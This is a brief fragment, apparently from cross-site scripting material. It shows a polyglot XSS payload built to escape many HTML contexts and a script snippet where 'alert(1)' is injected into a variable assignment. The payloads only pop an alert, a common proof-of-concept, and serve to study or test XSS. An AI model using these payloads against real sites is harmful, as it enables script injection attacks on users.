...
javascript:/_--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[_/[]/+alert(1)//'>
...
```js
<script>
  var contentType = 1; alert(1); var title = "This is a regular title"; … //some user agreement and
  sending to server logic might be here …
</script>
```
